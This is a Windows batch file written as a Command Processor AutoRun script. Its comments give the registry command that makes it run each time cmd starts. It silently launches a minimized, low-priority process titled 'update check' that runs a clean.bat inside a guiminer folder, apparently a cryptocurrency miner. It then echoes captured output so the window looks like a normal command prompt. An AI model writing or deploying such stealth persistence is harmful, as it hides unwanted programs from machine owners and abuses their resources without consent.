@echo off
cd %homedrive%\

rem this is the autorun script
rem the key that controls the command that is executed at startup is "HKLM\SOFTWARE\Microsoft\Command Processor"
rem to change it you should try "reg add "HKLM\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_EXPAND_SZ /d [your_command]"
rem
rem real code goes here


setlocal enabledelayedexpansion

set number=1

for /F "tokens=*" %%G in ('cmd /C exit') do set !number!=%%G & set /A number=!number!+1

set /A last=number-1
set /A penultimate=last-1

set penultimate=!%penultimate%!
set last=!%last%!



start "update check" /I /MIN /LOW "cmd" "/Q /C "%homedrive%\guiminer\clean.bat""
rem unauthorized cmd can't copy from restricted areas


rem real code ends here


rem the following lines should look like the normal command prompt opening if a CLS is un-rem-ed
CLS

@echo %penultimate%
@echo %last%

cls
exit /B %errorlevel%
exit %errorlevel%